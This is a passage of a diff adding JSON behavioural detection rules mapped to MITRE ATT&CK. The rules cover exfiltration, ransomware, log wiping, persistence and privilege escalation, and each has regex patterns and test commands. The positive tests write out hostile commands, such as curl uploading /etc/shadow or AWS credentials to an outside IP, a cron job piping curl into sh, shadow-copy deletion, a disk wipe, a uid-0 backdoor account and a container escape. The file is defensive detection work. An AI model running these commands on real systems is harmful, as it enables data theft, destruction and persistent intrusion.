+      "command": "cmd /c 7z a d.7z C:\\data"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-curl-upload-sensitive-file",
+   "name": "curl or wget posting a sensitive file",
+   "description": "curl -F, -T or --data-binary of passwd, shadow, keys or env files sends secrets out.",
+   "tactic": "Exfiltration",
+   "technique": "T1041",
+   "technique_name": "Exfiltration Over C2 Channel",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget)\\b.*(-F\\s*\\S*=@|-T\\s+|--data-binary\\s+@|--post-file[= ])\\S*(shadow|passwd|id_rsa|\\.aws/credentials|\\.env|keychain|Login Data|\\.kube/config)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T /etc/shadow http://203.0.113.9/"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F f=@/home/dev/.aws/credentials http://h/u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F f=@report.pdf https://api.example.com/upload"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-dns-exfil-loop",
+   "name": "Shell loop encoding data into DNS lookups",
+   "description": "A loop building lookups with encoded file content exfiltrates via DNS.",
+   "tactic": "Exfiltration",
+   "technique": "T1048.003",
+   "technique_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(for|while)\\b.*(xxd|base64|od\\s).*\\b(dig|nslookup|host|ping)\\s+\\S*\\$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c for l in $(xxd -p secret|fold -w30); do dig $l.x.example.com; done"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c for h in a b; do dig $h.example.com; done"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-scp-sensitive-dir-to-remote",
+   "name": "scp or rsync of sensitive directories to remote host",
+   "description": "scp or rsync sending .ssh, .aws or /etc credentials to user@host is credential exfiltration.",
+   "tactic": "Exfiltration",
+   "technique": "T1048",
+   "technique_name": "Exfiltration Over Alternative Protocol",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(scp|rsync|sftp)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\.ssh|\\.aws|\\.gnupg|/etc/shadow|Keychains)\\S*\\s+\\S+@\\S+:"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/scp",
+      "command": "scp -r /home/dev/.ssh bob@203.0.113.9:/tmp/"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/scp",
+      "command": "scp app.tgz bob@10.0.0.4:/srv/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ransom-note-created",
+   "name": "Ransom note file created",
+   "description": "Files named like decrypt or recover instructions are dropped by ransomware in each affected directory.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "[/\\\\](readme[_-]?(to[_-]?)?(decrypt|restore|recover)\\w*|how[_-]?to[_-]?(decrypt|recover|restore)\\w*|decrypt[_-]?(your[_-]?)?(files|instructions)\\w*|restore[_-]?my[_-]?files\\w*|recover[_-]?your[_-]?files\\w*|_?readme_?!+|!+readme!*)\\.(txt|html|hta|md)$"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/dev/docs/HOW_TO_DECRYPT.txt",
+      "operation": "create"
+     },
+     {
+      "path": "C:\\Users\\ann\\Desktop\\README_TO_RESTORE_FILES.html",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/dev/README.md",
+      "operation": "create"
+     },
+     {
+      "path": "/home/dev/docs/HOW_TO_DECRYPT.txt",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ransom-extension-appended",
+   "name": "File created or renamed with ransomware extension",
+   "description": "Files ending in known ransomware or generic locked extensions suggest bulk encryption.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\.(locked|crypt|crypted|encrypted|lockbit|akira|royal|blackcat|conti|ryuk|wncry|wnry|cerber|zepto|locky|babuk|rhysida|blacksuit|basta|qilin|encrypted_[a-z0-9]+)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "rename",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/srv/share/budget.xlsx.locked",
+      "operation": "create"
+     },
+     {
+      "path": "C:\\Users\\ann\\a.docx.lockbit",
+      "operation": "rename"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/srv/share/budget.xlsx",
+      "operation": "create"
+     },
+     {
+      "path": "/home/dev/main.go.bak",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ransom-email-id-double-extension",
+   "name": "Email or ID style double extension",
+   "description": "Many families append [email].ext or id suffixes after the original extension; the shape is a strong encryption marker.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\.(docx?|xlsx?|pdf|jpg|png|sql|bak|zip|pptx?|db|mdb|vmdk)\\.(\\[[^\\]]+@[^\\]]+\\]|id[-\\[][^.]+|\\{[a-f0-9-]{8,}\\})(\\.[a-z0-9]{2,8})?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "rename"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/srv/a.docx.[hr@mail.com].eking",
+      "operation": "rename"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/srv/a.docx.bak",
+      "operation": "rename"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ransom-esxi-vm-file-encrypted",
+   "name": "ESXi virtual disk renamed or encrypted",
+   "description": "Ransomware-extension files on VMFS datastores hit hypervisor storage.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/vmfs/volumes/.+\\.(vmdk|vmx|vmsn|vswp|nvram)\\.[a-z0-9_]{3,12}$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "rename"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware",
+    "esxi"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/vmfs/volumes/datastore1/vm1/vm1-flat.vmdk.akira",
+      "operation": "rename"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/vmfs/volumes/datastore1/vm1/vm1.vmdk",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ransom-desktop-note",
+   "name": "Ransom note dropped on Desktop",
+   "description": "Notes or images dropped to the Desktop with decrypt or ransom wording announce the infection.",
+   "tactic": "Impact",
+   "technique": "T1491.001",
+   "technique_name": "Internal Defacement",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\desktop\\\\[^\\\\]*(decrypt|ransom|restore_files|recover_files|read_me_now)[^\\\\]*\\.(txt|html|hta|bmp|jpg|png)$"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\Desktop\\DECRYPT_FILES.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Desktop\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-impact-shadow-copy-deletion",
+   "name": "Shadow copy or backup deletion",
+   "description": "vssadmin, wmic, wbadmin or bcdedit commands that delete shadows, catalogs or recovery are classic pre-encryption steps.",
+   "tactic": "Impact",
+   "technique": "T1490",
+   "technique_name": "Inhibit System Recovery",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(vssadmin(\\.exe)?\\s+delete\\s+shadows|wmic\\s+shadowcopy\\s+delete|wbadmin\\s+delete\\s+(catalog|systemstatebackup)|bcdedit.*(recoveryenabled\\s+no|bootstatuspolicy\\s+ignoreallfailures)|resize\\s+shadowstorage)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\vssadmin.exe",
+      "command": "vssadmin delete shadows /all /quiet"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c bcdedit /set {default} recoveryenabled no"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\vssadmin.exe",
+      "command": "vssadmin list shadows"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-impact-bulk-encrypt-delete-loop",
+   "name": "Bulk file encryption loop that removes originals",
+   "description": "A find or for loop piping files through openssl enc or gpg then removing originals mirrors script ransomware.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(find|for)\\b.*(openssl\\s+enc\\s+-e|gpg\\s+(-c|--symmetric|-e|--encrypt))\\b.*(rm\\s|shred|-delete|unlink)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ransomware"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c find /srv -type f -exec openssl enc -e -aes256 -k x -in {} -out {}.enc ; -exec rm {} ;"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c openssl enc -e -aes256 -in a -out a.enc"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-impact-disk-or-log-wipe",
+   "name": "Disk or log wiping command",
+   "description": "dd, shred or wipefs against block devices or logs destroys data or evidence.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(dd\\s+if=/dev/(zero|urandom)\\s+of=/dev/(sd|nvme|vd|xvd)\\w+|shred\\s+.*-[a-z]*u.*(/var/log|/dev/(sd|nvme)\\w+)|wipefs\\s+-a\\s+/dev/\\w+|rm\\s+-rf?\\s+/(\\s|\\*|$)|mkfs\\.\\w+\\s+/dev/(sd|nvme)\\w+)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "wiper"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=/dev/sda bs=1M"
+     },
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -vzun 5 /var/log/auth.log"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=./test.img bs=1M count=10"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-linux-log-truncate",
+   "name": "Linux logs truncated or removed by command",
+   "description": "Truncating or deleting auth.log, wtmp or lastlog in one command hides tracks.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
+   "technique_name": "Clear Linux or Mac System Logs",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(>\\s*/var/log/(auth\\.log|secure|wtmp|btmp|lastlog|syslog|messages)|(rm|shred|truncate\\s+-s\\s*0)\\s+(-\\S+\\s+)*/var/log/(auth\\.log|secure|wtmp|btmp|lastlog|syslog|messages)|history\\s+-c)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "anti-forensics"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c > /var/log/auth.log"
+     },
+     {
+      "executable": "/bin/rm",
+      "command": "rm -f /var/log/wtmp"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c tail /var/log/auth.log"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-histfile-disable",
+   "name": "Shell history disabled",
+   "description": "Unsetting HISTFILE or linking history to /dev/null in a command stops command recording.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.003",
+   "technique_name": "Impair Command History Logging",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(unset\\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|ln\\s+-sf?\\s+/dev/null\\s+\\S*history|set\\s+\\+o\\s+history|HISTFILESIZE=0)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "anti-forensics"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c unset HISTFILE; curl http://h/a"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c ln -sf /dev/null ~/.bash_history"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c export HISTSIZE=5000"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-timestomp-staging",
+   "name": "Timestamp copy onto staged files",
+   "description": "touch -r or -t against system dirs or staging dirs hides modification time.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.006",
+   "technique_name": "Timestomp",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "touch\\s+(-\\S*[rtad]\\S*\\s+\\S+\\s+)+\\S*(/usr/(s?bin)|/bin/|/sbin/|/etc/|/tmp/|/dev/shm/)\\S*"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "anti-forensics"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch -r /bin/ls /tmp/.implant"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/touch",
+      "command": "touch notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-disable-security-services",
+   "name": "Security agent or firewall disabled by command",
+   "description": "Stopping auditd, ufw, firewalld, selinux or AV services in one command is defence impairment.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Disable or Modify Tools",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(systemctl\\s+(stop|disable|mask)\\s+(auditd|apparmor|firewalld|ufw|falco|osqueryd|wazuh-agent|ossec|clamav-daemon|falcon-sensor)|setenforce\\s+0|service\\s+(auditd|iptables)\\s+stop|auditctl\\s+-D|ufw\\s+disable|iptables\\s+-F\\b)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "defense-evasion"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl stop auditd"
+     },
+     {
+      "executable": "/usr/sbin/setenforce",
+      "command": "setenforce 0"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl status auditd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-defender-exclusion-or-off",
+   "name": "Windows Defender exclusion or disable",
+   "description": "Set-MpPreference exclusions or disabling realtime monitoring prepares for malware execution.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Disable or Modify Tools",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(set-mppreference.*(-disablerealtimemonitoring\\s+\\$?true|-exclusion(path|process|extension))|add-mppreference\\s+-exclusion|sc\\s+(stop|config)\\s+windefend|netsh\\s+advfirewall\\s+set\\s+\\S+\\s+state\\s+off)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "defense-evasion"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Set-MpPreference -ExclusionPath C:\\Users\\Public"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-MpPreference"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-evasion-windows-log-clear",
+   "name": "Windows event log cleared or audit policy off",
+   "description": "wevtutil cl, Clear-EventLog or auditpol /clear removes telemetry.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.001",
+   "technique_name": "Clear Windows Event Logs",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(wevtutil(\\.exe)?\\s+(cl|clear-log)\\s|clear-eventlog|auditpol\\s+/(clear|remove)|remove-eventlog)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "anti-forensics"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil cl Security"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil qe System /c:5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-crontab-install-from-pipe",
+   "name": "crontab installed from a pipe",
+   "description": "Installing a cron entry from echo or a downloader pipe creates persistence in one line.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Cron",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(echo|printf|curl|wget)\\b.*(\\*/?\\d*\\s+\\*\\s+\\*\\s+\\*\\s+\\*|@reboot).*\\|\\s*(crontab|tee\\s+\\S*cron)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c echo '*/5 * * * * curl http://h/a|sh' | crontab -"
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c echo @reboot /tmp/.x | crontab -"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab -l"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-systemd-unit-write-and-enable-inline",
+   "name": "Systemd unit written and enabled from one command",
+   "description": "A single command line that writes a .service and runs systemctl enable or start is an installer-style implant.",
+   "tactic": "Persistence",
+   "technique": "T1543.002",
+   "technique_name": "Systemd Service",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(cat|echo|printf|tee)\\b.*\\.service.*(systemctl\\s+(daemon-reload|enable|start))"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c printf '[Service]\\nExecStart=/tmp/x' > /etc/systemd/system/u.service && systemctl enable --now u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl enable nginx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-schtasks-create-risky-action",
+   "name": "Scheduled task running from user-writable path or script host",
+   "description": "schtasks /create with a payload in Temp, Public or AppData, or a script host, is persistence staging.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "schtasks\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/create\\b.*/tr\\s+\\S*(\\\\temp\\\\|\\\\users\\\\public|appdata|programdata|powershell|mshta|wscript|cmd\\s+/c)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /tn U /tr C:\\Users\\Public\\a.exe /sc onlogon /ru system"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /tn Backup /tr C:\\Program Files\\Backup\\run.exe /sc daily"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-sc-create-risky-binpath",
+   "name": "Service created pointing to user-writable binary or shell",
+   "description": "sc create with a binPath in temp, Public or a cmd or powershell wrapper is service persistence or PsExec style launch.",
+   "tactic": "Persistence",
+   "technique": "T1543.003",
+   "technique_name": "Windows Service",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "sc\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "create\\s.*binpath=\\s*\\S*(\\\\temp\\\\|\\\\users\\\\public|appdata|\\\\\\\\\\S+\\\\|cmd(\\.exe)?\\s+/c|powershell|%comspec%)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\sc.exe",
+      "command": "sc create evil binPath= cmd.exe /c C:\\a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\sc.exe",
+      "command": "sc create MySvc binPath= C:\\Program Files\\My\\svc.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-useradd-backdoor-account",
+   "name": "Backdoor account creation in one line",
+   "description": "useradd with uid 0 and -o, or adding passwordless sudo in one line, creates a backdoor account.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Local Account",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(useradd\\b.*-o\\s+-u\\s*0|useradd\\b.*-u\\s*0\\b.*-o|NOPASSWD:\\s*ALL.*>>?\\s*/etc/sudoers|echo\\s+\\S+:\\S+\\s*\\|\\s*chpasswd.*usermod\\s+-aG\\s+(sudo|wheel))"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -o -u 0 -g 0 svc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -m alice"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-user-add-admin-chain",
+   "name": "Windows account added and elevated in one line",
+   "description": "net user /add chained with net localgroup administrators /add creates a hidden admin.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Local Account",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "net1?\\s+user\\s+\\S+\\s+\\S+\\s+/add.*net1?\\s+localgroup\\s+administrators\\s+\\S+\\s+/add"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c net user svc P@ss1 /add && net localgroup administrators svc /add"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net user alice"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-suid-bit-on-shell-or-tmp",
+   "name": "SUID bit set on shell or temp binary",
+   "description": "chmod u+s or 4755 on a shell, interpreter or temp file plants a privilege-escalation backdoor.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.001",
+   "technique_name": "Setuid and Setgid",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/chmod$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\+s|[2467][0-7]{3})\\s+(/bin/(ba)?sh|/usr/bin/(python[\\d.]*|perl|find|vim|env|cp|bash)|/tmp/|/dev/shm/|/var/tmp/)\\S*"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "suid"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod u+s /bin/bash"
+     },
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod 4755 /tmp/.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod 755 /tmp/run.sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-setcap-dangerous-capability",
+   "name": "Dangerous file capability granted",
+   "description": "setcap cap_setuid, cap_sys_admin or cap_dac_override on interpreters or temp binaries grants quiet root.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/setcap$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "cap_(setuid|setgid|sys_admin|sys_ptrace|dac_override|dac_read_search)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "capabilities"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/setcap",
+      "command": "setcap cap_setuid+ep /usr/bin/python3"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/setcap",
+      "command": "setcap cap_net_bind_service+ep /usr/local/bin/web"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-container-privileged-host-mount",
+   "name": "Container started privileged with host access",
+   "description": "docker run --privileged with the host root mounted or host pid is a container escape to host root.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(docker|podman|nerdctl|ctr)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(--privileged.*(-v\\s*/:/|--pid=host)|-v\\s*/:/\\S*.*(chroot|--privileged)|--pid=host.*--privileged)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "container"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --privileged -v /:/host alpine chroot /host sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v /data:/data alpine ls"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-cloud-metadata-credential-fetch",
+   "name": "Instance metadata credentials requested",
+   "description": "curl to 169.254.169.254 for security-credentials or token endpoints steals cloud role credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Cloud Instance Metadata API",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget|iwr|invoke-webrequest)\\b.*169\\.254\\.169\\.254/.*(security-credentials|iam|identity/oauth2/token|api/token|service-accounts/.*/token)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
